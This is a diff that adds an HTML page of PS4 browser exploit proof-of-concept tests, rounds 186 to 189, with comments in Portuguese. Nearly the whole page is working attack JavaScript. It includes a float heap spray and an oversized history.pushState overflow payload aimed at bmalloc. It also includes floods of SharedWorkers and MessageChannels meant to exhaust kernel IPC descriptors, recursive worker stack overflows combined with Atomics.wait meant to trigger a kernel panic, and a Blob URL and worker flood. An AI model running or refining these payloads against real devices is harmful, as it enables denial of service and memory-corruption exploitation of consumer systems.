@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PS4 Browser PoC Tests - Parte 31</title>
+</head>
+<body>
+    <h1>Testes White-Box (Heap Spraying e Sincronismo) - Rodada 31</h1>
+    <p>Focando nas vulnerabilidades estruturais de ContainerNode.cpp, DOMWindow.cpp e HTMLMediaElement.cpp.</p>
+    
+    
+    <button onclick="runTest186()">Teste 186: History pushState + DOM Allocation (Heap Smash)</button>
+    <button onclick="runTest187()">Teste 187: SharedWorker + MessageChannel (IPC Descriptor Exhaustion)</button>
+    <button onclick="runTest188()">Teste 188: Pthread Stack Overflow + Atomics Wait (Kernel Freeze)</button>
+    <button onclick="runTest189()">Teste 189: Worker ID Wraparound + Blob URL Flood</button>   
+    
+    <hr>
+    <h3>Saída / Registo:</h3>
+    <div id="output" style="white-space: pre-wrap; font-family: monospace;">A aguardar execução...</div>
+<div id="sandbox"></div>
+
+    <div id="test-containers"></div>
+
+<script>
+        function logOutput(msg) {
+            const out = document.getElementById('output');
+            out.innerText = msg + '\n' + out.innerText;
+        }
+
+        function clearOutput() {
+            document.getElementById('output').innerText = '--- A iniciar novo teste ---\n';
+            document.getElementById('test-containers').innerHTML = '';
+        }
+
+        // O Spray Elegante: Baseado na sua POC, injeta 0x4141414141414141 usando floats
+        function elegantFloatSpray() {
+            let spray = [];
+            // Apenas 2000 arrays (baixo consumo de RAM, longe de OOM)
+            for(let i = 0; i < 2000; i++) {
+                const poison = new Float64Array(128); // Bloco pequeno e rápido
+                poison.fill(2.121995791e-314); 
+                spray.push(poison);
+            }
+            return spray;
+        }
+
+  
+// ==========================================
+        // Teste 186: History pushState + DOM Allocation (Heap Smash)
+        // Evolução da sua POC: Funde o overflow do history com alocação DOM massiva para forçar o crash
+        // ==========================================
+        function runTest186() {
+            clearOutput();
+            logOutput("[Teste 186] A iniciar Heap Smash no histórico...");
+            try {
+                const BASE_SIZE = 709522; // Alvo do bucket de 1MB
+                const OOB_SIZE = 340000;
+                
+                const base = "A".repeat(BASE_SIZE);
+                const overflow = "\x01".repeat(OOB_SIZE);
+                const payload = "/" + base + overflow + "AAAA";
+
+                // Injeta na memória C++
+                history.pushState({}, "", payload);
+                logOutput("Payload injetado no bmalloc. A forçar leitura da memória corrompida...");
+
+                // Imediatamente aloca milhares de nós DOM para forçar o alocador a colidir com o overflow
+                let frag = document.createDocumentFragment();
+                for(let i = 0; i < 50000; i++) {
+                    let d = document.createElement('div');
+                    d.className = "A".repeat(100); // Usa memória contígua
+                    frag.appendChild(d);
+                }
+                document.body.appendChild(frag);
+                logOutput("Alocação DOM concluída sem Crash imediato.");
+
+            } catch(e) {
+                logOutput("Erro: " + e);
+            }
+        }
+
+        // ==========================================
+        // Teste 187: SharedWorker + MessageChannel (IPC Descriptor Exhaustion)
+        // Usa a técnica de SharedWorker mas sobrecarrega com portas MessageChannel
+        // ==========================================
+        window.keeps187 = [];
+        function runTest187() {
+            clearOutput();
+            logOutput("[Teste 187] A esgotar descritores IPC no Kernel FreeBSD...");
+            
+            let count = 0;
+            const interval = setInterval(() => {
+                for (let i = 0; i < 10; i++) {
+                    try {
+                        let id = "kpanic_ipc_" + Date.now() + "_" + count;
+                        let sw = new SharedWorker("data:text/javascript,onconnect=e=>{}", id);
+                        
+                        // O golpe: Cada MessageChannel cria um pipe IPC no Kernel
+                        let mc = new MessageChannel();
+                        sw.port.postMessage("open", [mc.port2]);
+                        
+                        window.keeps187.push(sw);
+                        window.keeps187.push(mc.port1); // Mantém a porta viva
+                        count++;
+                    } catch(e) {
+                        clearInterval(interval);
+                        logOutput("Falha de alocação IPC aos: " + count + " workers.");
+                        return;
+                    }
+                }
+                if (count % 50 === 0) logOutput("Portas IPC ativas: " + count);
+                if (count > 800) clearInterval(interval); // Proteção caso não crashe
+            }, 10);
+        }
+
+        // ==========================================
+        // Teste 188: Pthread Stack Overflow + Atomics Wait (Kernel Freeze)
+        // ==========================================
+        function runTest188() {
+            clearOutput();
+            logOutput("[Teste 188] A forçar Stack Overflow em Pthreads via Atomics...");
+            
+            const workerCode = `
+                onmessage = (e) => {
+                    const sab = e.data;
+                    const view = new Int32Array(sab);
+                    
+                    // Função recursiva para estourar a Red Zone da Thread
+                    function explodeStack(n) {
+                        const v = new Float64Array(256); // Aloca muito no stack
+                        if (n > 0) explodeStack(n - 1);
+                        else Atomics.wait(view, 0, 0); // Congela a thread no Kernel estando o stack corrompido
+                    }
+                    
+                    try { explodeStack(1000); } catch(err) { postMessage("Stack mitigado: " + err); }
+                }
+            `;
+            const blob = new Blob([workerCode], {type: "text/javascript"});
+            const url = URL.createObjectURL(blob);
+            
+            const sab = new SharedArrayBuffer(1024);
+            
+            // Lança várias threads simultâneas para esmagar a CPU
+            for(let i=0; i < 20; i++) {
+                let w = new Worker(url);
+                w.onmessage = (e) => logOutput(e.data);
+                w.postMessage(sab);
+            }
+            logOutput("20 Threads enviadas para o abismo do Stack. A aguardar Kernel Panic...");
+        }
+
+        // ==========================================
+        // Teste 189: Worker ID Wraparound + Blob URL Flood
+        // ==========================================
+        function runTest189() {
+            clearOutput();
+            logOutput("[Teste 189] A inundar o registo de URLs e IDs do Kernel...");
+            
+            let count = 0;
+            const interval = setInterval(() => {
+                for(let i = 0; i < 20; i++) {
+                    // Cria Blobs únicos constantemente para estressar o FileSystem virtual
+                    let blob = new Blob(["// Lixo " + count + "_" + i], {type: "text/javascript"});
+                    let url = URL.createObjectURL(blob);
+                    
+                    // Cria e abandona Workers para forçar Wraparound de IDs
+                    let w = new Worker(url);
+                    w.postMessage("die");
+                }
+                count += 20;
+                if (count % 500 === 0) logOutput("Workers & Blobs gerados: " + count);
+                if (count > 5000) clearInterval(interval);
+            }, 10);
+        }
+
+        window.onerror = function(msg, src, line, col, err) {
+    const out = document.getElementById('output');
+    if (out) {
+        out.innerText = "[ERRO GLOBAL] " + msg + "\n" + out.innerText;
+    }
+};
+
+</script>
+</body>
+</html>
